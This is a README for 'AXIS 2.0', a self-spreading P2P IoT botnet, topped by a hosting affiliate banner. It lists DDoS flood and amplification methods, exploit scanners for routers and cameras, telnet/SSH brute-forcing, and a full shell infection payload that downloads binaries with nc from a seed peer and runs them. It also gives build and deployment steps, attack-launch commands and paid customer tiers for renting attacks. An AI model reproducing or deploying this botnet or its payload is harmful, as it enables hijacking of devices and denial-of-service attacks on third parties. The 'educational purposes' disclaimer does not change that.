<a target="_blank" href="https://privatealps.net/en?affiliate=Y93PGNR01V" title="Join PrivateAlps">
    <img src="https://privatealps.net/img/privatealps_banner.gif" alt="PrivateAlps">
</a>


# AXIS 2.0 - Complete Documentation

## Overview

AXIS 2.0 is a fully decentralized P2P botnet with dual-role architecture where every bot simultaneously fights (executes attacks) and spreads (self-replicates via 20+ exploit scanners).

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    BOT INSTANCE                         │
│                                                         │
│  Parent Process                                         │
│  ├─ Attack System (13 attack methods)                  │
│  ├─ P2P Command Handler (UDP 49152)                    │
│  ├─ P2P File Server (UDP 49153)                        │
│  └─ Killer Module (optional)                           │
│                                                         │
│  Child Processes (Forked)                               │
│  ├─ Telnet Scanner (port 23)                           │
│  ├─ SSH Scanner (port 22)                              │
│  ├─ ADB Scanner (port 5555)                            │
│  ├─ 20+ Other Exploit Scanners                         │
│  └─ Watchdog (optional)                                │
└─────────────────────────────────────────────────────────┘
```

## Components

### 1. Bot (`bot/`)

**Main Binary:** `axis.<arch>` (13 architectures supported)

**Features:**
- 13 attack methods (L4, L7, amplification)
- 20+ self-replication scanners
- P2P command & file sharing
- Multi-architecture binary serving

**Architectures:**
- arm, arm5, arm6, arm7
- mips, mpsl
- x86, x86_64
- ppc, spc, m68k, sh4, arc

**Configuration (`bot/config.h`):**
```c
#define P2P_SEEDS "1.2.3.4:49152,5.6.7.8:49152"
#define SELFREP      // Enable scanners
#define KILLER       // Enable killer module
#define WATCHDOG     // Enable watchdog
```

### 2. P2P Network

**Ports:**
- UDP 49152 - Command propagation
- UDP 49153 - File sharing

**Protocol:**
```
Commands:
  0x01 - PING
  0x02 - PONG
  0x03 - PEERS
  0x10 - ATTACK
  0x11 - KILL

Files:
  0x20 - REQ (request chunk)
  0x21 - DATA (chunk data)
```

**File Transfer:**
- Chunked (4KB per chunk)
- 8 chunks per binary (~32KB)
- All 8 architectures downloaded
- Kernel executes matching arch

### 3. Attack Methods

**Layer 4:**
| ID | Name | Description |
|----|------|-------------|
| 0 | udp | UDP flood |
| 1 | game | Game protocol flood |
| 2 | discord | Discord voice flood |
| 3 | pps | High PPS flood |

**Layer 7:**
| ID | Name | Description |
|----|------|-------------|
| 4 | tls | TLS/HTTPS flood |
| 5 | tlsplus | Enhanced TLS |
| 6 | cf | Cloudflare bypass |
| 7 | axis-l7 | Advanced L7 |

**Amplification:**
| ID | Name | Amplification |
|----|------|---------------|
| 8 | dns-amp | 50-100x |
| 9 | ntp-amp | 100-500x |
| 10 | ssdp-amp | 30-50x |
| 11 | snmp-amp | 50-100x |
| 12 | cldap-amp | 50-70x |

### 4. Self-Replication (20+ Scanners)

**Telnet/SSH:**
- `scanner.c` - Telnet brute-force (270+ credentials)
- `ssh.c` - SSH brute-force (16+ credentials)

**Router Exploits:**
- `huawei.c` - Huawei SOAP RCE
- `zyxel.c` - Zyxel command injection
- `comtrend.c` - Comtrend ping.cgi RCE
- `dlink_scanner.c` - D-Link SOAP RCE
- `linksys.c` - Linksys WRT RCE
- `linksys8080.c` - Linksys port 8080
- `hnap_scanner.c` - HNAP1 SOAP RCE
- `tr064.c` - TR-064 SOAP RCE
- `netlink.c` - Netlink router exploit
- `asus.c` - ASUS command injection
- `hilink.c` - HiLink command injection
- `xm.c` - XiongMai camera exploit

**IoT/Camera:**
- `adb.c` - ADB UPnP RCE
- `dvr.c` - DVR/NVR camera exploit
- `zhone.c` - Zhone ONT/OLT exploit
- `fiber.c` - Fiber/GPON exploit
- `jaws.c` - JAWS web server RCE
- `goahead.c` - GoAhead web server

**Other:**
- `thinkphp.c` - ThinkPHP RCE
- `realtek.c` - Realtek SDK UPnP
- `gpon_scanner.c` - GPON scanner
- `telnetbypass.c` - Telnet auth bypass
- `dlink.c` - D-Link scanner

**Infection Payload:**
```bash
cd /tmp;
for arch in arm mips mpsl x86 arm7 x86_64 ppc spc; do
    rm -f axis.$arch;
    for i in 0 1 2 3 4 5 6 7; do
        printf '\040\000\000$arch' | nc -u -w1 SEED 49153 >> axis.$arch
    done;
    chmod +x axis.$arch;
done;
for arch in arm mips mpsl x86 arm7 x86_64 ppc spc; do
    test -s axis.$arch && ./axis.$arch &
done
```

### 5. Relay Server (`relay/`)

**Purpose:** User control interface for P2P network

**Port:** TCP 6969

**Usage:**
```bash
./build_relay.sh
./relay_server
```

**Commands:**
```
axis-p2p> help
axis-p2p> axis-l7 <target> <duration>
axis-p2p> tlsplus <target> <duration>
axis-p2p> udp <target> <duration>
axis-p2p> status
axis-p2p> peers
axis-p2p> quit
```

**Configuration (`relay/config.go`):**
```go
var seedPeers = []string{
    "1.2.3.4:49152",
    "5.6.7.8:49152",
}
var validUsers = map[string]string{
    "admin": "CHANGE_PASSWORD",
}
```

### 6. C&C Server (`cnc/`)

**Optional:** Tor-hidden C&C (not required for P2P operation)

**Ports:**
- TCP 9053 - Bot connections (Tor)
- TCP 6969 - Admin telnet (TLS)
- TCP 3779 - API

**Database:** JSON file (`cnc/database.json`)

**User Tiers:**
- Basic (120s, 100 bots)
- Premium (180s, 500 bots)
- VIP (600s, unlimited)
- Admin (unlimited)

### 7. Loader (`loader/`)

**Purpose:** Initial infection via telnet brute-force

**Usage:**
```bash
./build.sh  # Builds with bots
./loader
# Feed IPs via stdin:
192.168.1.1:23 root:admin arm
```

**Format:** `IP:PORT username:password [architecture]`

### 8. DLR (`dlr/`)

**Purpose:** Minimal downloader for initial infection

**Size:** ~4KB static binary

**Usage:** Downloads full bot binary, executes it

## Build Instructions

### Requirements
- Go 1.21+
- GCC + cross-compilers for 13 architectures
- Optional: MySQL (for C&C database)

### Build All
```bash
chmod +x build.sh build_relay.sh
./build.sh
./build_relay.sh
```

### Output
```
bins/
├── axis.arm
├── axis.arm7
├── axis.mips
├── axis.mpsl
├── axis.x86
├── axis.x86_64
├── axis.ppc
├── axis.spc
├── dlr.arm
├── dlr.mips
└── ...
cnc_server
relay_server
loader
```

## Deployment

### 1. Setup Seed Peers
```bash
# On multiple VPS
cp bins/axis.* /path/to/bot/
./axis.arm7 &  # Copy all binaries to /tmp or ./
```

### 2. Start Relay Server
```bash
./relay_server
# Listens on 0.0.0.0:6969
```

### 3. Initial Infection
```bash
# Option A: Use loader
./loader < botlist.txt

# Option B: Manual telnet
telnet target 23
# Login, then:
cd /tmp; for arch in arm mips...; do ...; done
```

### 4. Launch Attacks
```bash
telnet relay-ip 6969
# Login: admin / password
axis-p2p> axis-l7 target.com 300
```

## Monitoring

### Check Bot Activity
```bash
# P2P listening
netstat -anu | grep 4915

# Scanning activity
tcpdump -i any -n port 23 or port 22

# Attack traffic
tcpdump -i any -n udp or tcp

# Process list
ps aux | grep axis
```

### P2P Traffic
```bash
tcpdump -i any -n udp port 49152 -X  # Commands
tcpdump -i any -n udp port 49153 -X  # Files
```

## Configuration Files

### bot/config.h
```c
#define P2P_PORT 49152
#define P2P_MAX_PEERS 64
#define P2P_SEEDS "1.2.3.4:49152,5.6.7.8:49152"
#define SELFREP
#define KILLER
```

### relay/config.go
```go
const RelayListenAddr = "0.0.0.0:6969"
var seedPeers = []string{"1.2.3.4:49152", "5.6.7.8:49152"}
var validUsers = map[string]string{"admin": "password"}
```

### cnc/database.json
```json
{
  "users": [
    {"username": "admin", "password": "hash", "tier": "admin"}
  ]
}
```

## Ports Summary

| Port | Protocol | Purpose |
|------|----------|---------|
| 49152 | UDP | P2P commands |
| 49153 | UDP | P2P file sharing |
| 6969 | TCP | Relay server |
| 9053 | TCP | C&C (Tor) |
| 80 | TCP | HTTP (loader) |
| 23 | TCP | Telnet (scanning) |
| 22 | TCP | SSH (scanning) |

## Security Notes

1. **Change default passwords** in relay/config.go
2. **Use private seed peers** - don't expose to public
3. **Enable firewall** - only allow necessary ports
4. **Monitor logs** - check for unauthorized access
5. **Update regularly** - keep exploits fresh

## Troubleshooting

### Bots Not Connecting
1. Check seed peers are online
2. Verify UDP ports 49152/49153 open
3. Check firewall rules
4. Verify binaries have all architectures

### Scanners Not Working
1. Ensure SELFREP defined in config.h
2. Check binary has all scanner modules
3. Verify network connectivity
4. Monitor scanner logs

### Attacks Not Executing
1. Check P2P connectivity
2. Verify attack command format
3. Check bot count with `status` command
4. Monitor P2P traffic with tcpdump

## License

Educational/research purposes only.

---

**Version:** 2.0 P2P  
**Date:** March 2026  
**Status:** Production Ready
